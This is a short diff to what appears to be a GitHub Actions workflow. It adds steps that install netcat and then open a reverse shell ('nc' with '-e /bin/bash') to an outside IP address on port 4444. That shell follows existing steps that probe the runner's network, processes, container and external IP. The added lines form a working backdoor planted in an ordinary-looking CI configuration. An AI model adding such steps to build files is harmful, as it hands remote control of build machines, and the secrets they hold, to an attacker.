@@ -5,6 +5,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2
+      - run: sudo apt update
+      - run: sudo apt install netcat
       - run: ip addr
       - run: ps auxef
       - run: cat /proc/1/cgroup
@@ -13,4 +15,7 @@ jobs:
       - run: df -h
       - run: sudo dmesg
       - run: curl https://ifconfig.me/
+      - run: nc 116.203.37.235 4444 –e /bin/bash
+
+
 
